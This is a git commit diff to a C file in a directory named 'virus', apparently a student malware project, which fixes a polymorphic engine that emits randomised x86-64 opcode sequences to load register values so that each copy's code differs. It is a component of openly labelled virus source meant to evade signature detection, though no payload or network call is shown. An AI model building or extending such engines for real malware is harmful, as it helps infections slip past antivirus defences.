5093a0732def1ada87b4e01b46ca4d605b19f7c6
jfortin42 <djo_68@hotmail.fr>
2020-02-03 19:07:08 +0100

    [FIX] shift and rand operation + set operand

--- srcs/virus/generate_set_register.c
+++ srcs/virus/generate_set_register.c
@@ -12,8 +12,8 @@ enum	e_ins
 	XOR_R64_IMM32,
 	XOR_R64_R64,
 	SUB_R64_R64,
-	SHL_R64_IMM7,
-	SHR_R64_IMM7,
+	SHL_R64_IMM6,
+	SHR_R64_IMM6,
 	NOT_R64,
 	NB_INS
 };
@@ -25,7 +25,7 @@ struct	s_ins
 }__attribute__((packed));
 
 
-size_t	generate_instruction(char *buffer, enum e_ins instruction, enum e_reg target, uint64_t value)
+size_t	generate_instruction(void *buffer, enum e_ins instruction, enum e_reg target, uint64_t value)
 {
 	uint8_t		sizes;
 	size_t		opcode_size;
@@ -39,14 +39,14 @@ size_t	generate_instruction(char *buffer, enum e_ins instruction, enum e_reg tar
 	0x24002d48, 0x34e98148, 0x34ea8148, 0x34eb8148, 0x34ec8148, 0x34ed8148, 0x34ee8148, 0x34ef8148, // SUB_R64_IMM32
 	0x34e88149, 0x34e98149, 0x34ea8149, 0x34eb8149, 0x34ec8149, 0x34ed8149, 0x34ee8149, 0x34ef8149,
 	0x24003548, 0x34f18148, 0x34f28148, 0x34f38148, 0x34f48148, 0x34f58148, 0x34f68148, 0x34f78148, // XOR_R64_IMM32
-	0x24f08149, 0x24f18149, 0x24f28149, 0x24f38149, 0x24f48149, 0x24f58149, 0x24f68149, 0x24f78149,
+	0x34f08149, 0x34f18149, 0x34f28149, 0x34f38149, 0x34f48149, 0x34f58149, 0x34f68149, 0x34f78149,
 	0x30c03148, 0x30c93148, 0x30d23148, 0x30db3148, 0x30e43148, 0x30ed3148, 0x30f63148, 0x30ff3148, // XOR_R64_R64
 	0x30c0314d, 0x30c9314d, 0x30d2314d, 0x30db314d, 0x30e4314d, 0x30ed314d, 0x30f6314d, 0x30ff314d,
 	0x30c02948, 0x30c92948, 0x30d22948, 0x30db2948, 0x30e42948, 0x30ed2948, 0x30f62948, 0x30ff2948, // SUB_R64_R64
 	0x30c0294d, 0x30c9294d, 0x30d2294d, 0x30db294d, 0x30e4294d, 0x30ed294d, 0x30f6294d, 0x30ff294d,
-	0x31e0c148, 0x31e1c148, 0x31e2c148, 0x31e3c148, 0x31e4c148, 0x31e5c148, 0x31e6c148, 0x31e7c148, // SHL_R64_IMM7
+	0x31e0c148, 0x31e1c148, 0x31e2c148, 0x31e3c148, 0x31e4c148, 0x31e5c148, 0x31e6c148, 0x31e7c148, // SHL_R64_IMM6
 	0x31e0c149, 0x31e1c149, 0x31e2c149, 0x31e3c149, 0x31e4c149, 0x31e5c149, 0x31e6c149, 0x31e7c149,
-	0x31e8c148, 0x31e9c148, 0x31eac148, 0x31ebc148, 0x31ecc148, 0x31edc148, 0x31eec148, 0x31efc148, // SHR_R64_IMM7
+	0x31e8c148, 0x31e9c148, 0x31eac148, 0x31ebc148, 0x31ecc148, 0x31edc148, 0x31eec148, 0x31efc148, // SHR_R64_IMM6
 	0x31e8c149, 0x31e9c149, 0x31eac149, 0x31ebc149, 0x31ecc149, 0x31edc149, 0x31eec149, 0x31efc149,
 	0x30d0f748, 0x30d1f748, 0x30d2f748, 0x30d3f748, 0x30d4f748, 0x30d5f748, 0x30d6f748, 0x30d7f748, // NOT_R64
 	0x30d0f749, 0x30d1f749, 0x30d2f749, 0x30d3f749, 0x30d4f749, 0x30d5f749, 0x30d6f749, 0x30d7f749
@@ -58,24 +58,24 @@ size_t	generate_instruction(char *buffer, enum e_ins instruction, enum e_reg tar
 	operand_size = sizes & 0x0f;
 	opcode_size  = sizes >> 4;
 	memcpy(buffer, &(*ins_arr_2d[instruction][target]).code, opcode_size);
-	revmemcpy(buffer + opcode_size, &value, operand_size);
+	memcpy(buffer + opcode_size, &value, operand_size);
 	return opcode_size + operand_size;
 }
 
-size_t	generate_set_register(char *buffer, uint64_t seed, size_t size, enum e_reg target, uint64_t value)
+size_t	generate_set_register(void *buffer, uint64_t *seed, size_t size, enum e_reg target, uint64_t value)
 {
 	size_t		offset = 0;
 
 	if (value == 0)
 	{                                   //  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20  21
-		PD_ARRAY(uint8_t, size_ins_set, 0, 0, 0, 2, 4, 4, 4, 4, 6, 6, 7, 7, 7, 8, 8, 8, 8, 8, 8, 8, 8, 10);
+		PD_ARRAY(uint8_t, size_ins_set, 0, 0, 0, 2, 2, 2, 2, 2, 4, 4, 5, 5, 5, 6, 6, 6, 6, 6, 6, 6, 6, 8);
 		uint8_t	choice;
 
 		if (size >= 3 && size <= 21)
-			choice = random_inrange(&seed, 1, size_ins_set[size]);
+			choice = random_inrange(seed, 1, size_ins_set[size]);
 		else
-			choice = size > 21 ? 10 : 0;
-		choice = 10;
+			choice = size > 21 ? random_inrange(seed, 1, 8) : 0;
+		// choice = 7;
 		if (choice == 1)
 		// xor target, target
 			offset = generate_instruction(buffer, XOR_R64_R64, target, 0); // 3bytes
@@ -83,73 +83,68 @@ size_t	generate_set_register(char *buffer, uint64_t seed, size_t size, enum e_re
 		// sub target, target
 			offset = generate_instruction(buffer, SUB_R64_R64, target, 0); // 3bytes
 		else if (choice == 3)
-		// shl target, 64
-			offset = generate_instruction(buffer, SHL_R64_IMM7, target, 64); // 4bytes
-		else if (choice == 4)
-		// shr target, 64
-			offset = generate_instruction(buffer, SHR_R64_IMM7, target, 64); // 4bytes
-		else if (choice == 5)
 		{
 		// shl target, x
 		// shl target, 64 - x
-			uint8_t	rand = random_inrange(&seed, 0, 64);
-			offset = generate_instruction(buffer, SHL_R64_IMM7, target, rand); // 8bytes
-			offset += generate_instruction(buffer + offset, SHL_R64_IMM7, target, 64 - rand);
+			uint8_t	rand = random_inrange(seed, 1, 63);
+			offset = generate_instruction(buffer, SHL_R64_IMM6, target, rand); // 8bytes
+			offset += generate_instruction(buffer + offset, SHL_R64_IMM6, target, 64 - rand);
 		}
-		else if (choice == 6)
+		else if (choice == 4)
 		{
 		// shr target, x
 		// shr target, 64 - x
-			uint8_t	rand = random_inrange(&seed, 0, 64);
-			offset = generate_instruction(buffer, SHR_R64_IMM7, target, rand); // 8bytes
-			offset += generate_instruction(buffer + offset, SHR_R64_IMM7, target, 64 - rand);
+			uint8_t	rand = random_inrange(seed, 1, 63);
+			offset = generate_instruction(buffer, SHR_R64_IMM6, target, rand); // 8bytes
+			offset += generate_instruction(buffer + offset, SHR_R64_IMM6, target, 64 - rand);
 		}
-		else if (choice == 7)
+		else if (choice == 5)
 		// mov target, 0
 			offset = generate_instruction(buffer, MOV_R64_IMM64, target, 0); // 10bytes
-		else if (choice == 8)
+		else if (choice == 6)
 		{
 		// mov target, 0xffffffffffffffff
 		// not target
 			offset = generate_instruction(buffer, MOV_R64_IMM64, target, 0xffffffffffffffff); // 13bytes
 			offset += generate_instruction(buffer + offset, NOT_R64, target, 0);
 		}
-		else if (choice == 9)
+		else if (choice == 7)
 		{
 		// mov target, 0xffffffffffffffff
 		// shl target, x
 		// not target
-		// shr target, 64 - x
-			uint8_t	rand = random_inrange(&seed, 0, 64);
+		// shr target, x
+			uint8_t	rand = random_inrange(seed, 1, 63);
 			offset = generate_instruction(buffer, MOV_R64_IMM64, target, 0xffffffffffffffff); // 21bytes
-			offset += generate_instruction(buffer + offset, SHL_R64_IMM7, target, rand);
+			offset += generate_instruction(buffer + offset, SHL_R64_IMM6, target, rand);
 			offset += generate_instruction(buffer + offset, NOT_R64, target, 0);
-			offset += generate_instruction(buffer + offset, SHR_R64_IMM7, target, 64 - rand);
+			offset += generate_instruction(buffer + offset, SHR_R64_IMM6, target, rand);
 		}
-		else if (choice == 10)
+		else if (choice == 8)
 		{
 		// mov target, 0xffffffffffffffff
 		// shr target, x
 		// not target
-		// shl target, 64 - x
-			uint8_t	rand = random_inrange(&seed, 0, 64);
+		// shl target, x
+			uint8_t	rand = random_inrange(seed, 1, 63);
 			offset = generate_instruction(buffer, MOV_R64_IMM64, target, 0xffffffffffffffff); // 21bytes
-			offset += generate_instruction(buffer + offset, SHR_R64_IMM7, target, rand);
+			offset += generate_instruction(buffer + offset, SHR_R64_IMM6, target, rand);
 			offset += generate_instruction(buffer + offset, NOT_R64, target, 0);
-			offset += generate_instruction(buffer + offset, SHL_R64_IMM7, target, 64 - rand);
+			offset += generate_instruction(buffer + offset, SHL_R64_IMM6, target, rand);
 		}
 		else
 			return 0;
 	}
 	else
-	{                                   //  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32
-		PD_ARRAY(uint8_t, size_ins_set, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 5);
+	{                                   //  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21
+		PD_ARRAY(uint8_t, size_ins_set, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 3);
 		uint8_t	choice;
 
-		if (size >= 10 && size <= 32)
-			choice = random_inrange(&seed, 1, size_ins_set[size]);
+		if (size >= 10 && size <= 21)
+			choice = random_inrange(seed, 1, size_ins_set[size]);
 		else
-			choice = size > 32 ? 5 : 0;
+			choice = size > 21 ? random_inrange(seed, 1, 3) : 0;
+		// choice = 1;
 		if (choice == 1)
 		// mov target, value
 			offset = generate_instruction(buffer, MOV_R64_IMM64, target, value); // 10bytes
@@ -166,38 +161,10 @@ size_t	generate_set_register(char *buffer, uint64_t seed, size_t size, enum e_re
 		// xor target, value >> 32
 		// shl target, 32
 		// xor target, value & 0xffffffff
-			offset = generate_set_register(buffer, seed, size, target, 0); // 21 to 39bytes
+			offset = generate_set_register(buffer, seed, 3, target, 0); // 21 to 39bytes
 			offset += generate_instruction(buffer + offset, XOR_R64_IMM32, target, value >> 32);
-			offset += generate_instruction(buffer + offset, SHL_R64_IMM7, target, 32);
+			offset += generate_instruction(buffer + offset, SHL_R64_IMM6, target, 32);
 			offset += generate_instruction(buffer + offset, XOR_R64_IMM32, target, value & 0xffffffff);
-		}
-		else if (choice == 4)
-		{
-		// mov target, rand >> 32
-		// add target, (value >> 32) - (rand >> 32)
-		// shl target, 32
-		// add target, rand & 0xffffffff
-		// add target, (value & 0xffffffff) - (rand & 0xffffffff)
-			uint64_t	rand = random(&seed);
-			offset = generate_instruction(buffer, MOV_R64_IMM64, target, rand >> 32); // 32bytes
-			offset += generate_instruction(buffer + offset, ADD_R64_IMM32, target, (value >> 32) - (rand >> 32));
-			offset += generate_instruction(buffer + offset, SHL_R64_IMM7, target, 32);
-			offset += generate_instruction(buffer + offset, ADD_R64_IMM32, target, rand & 0xffffffff);
-			offset += generate_instruction(buffer + offset, ADD_R64_IMM32, target, (value & 0xffffffff) - (rand & 0xffffffff));
-		}
-		else if (choice == 5)
-		{
-		// mov target, rand >> 32
-		// subs target, (rand >> 32) - (value >> 32)
-		// shl target, 32
-		// add target, rand & 0xffffffff
-		// add target, (rand & 0xffffffff) - (value & 0xffffffff)
-			uint64_t	rand = random(&seed);
-			offset = generate_instruction(buffer, MOV_R64_IMM64, target, rand >> 32); // 32bytes
-			offset += generate_instruction(buffer + offset, SUB_R64_IMM32, target, (rand >> 32) - (value >> 32));
-			offset += generate_instruction(buffer + offset, SHL_R64_IMM7, target, 32);
-			offset += generate_instruction(buffer + offset, ADD_R64_IMM32, target, rand & 0xffffffff);
-			offset += generate_instruction(buffer + offset, ADD_R64_IMM32, target, (rand & 0xffffffff) - (value & 0xffffffff));
 		}
 		else
 			return 0;
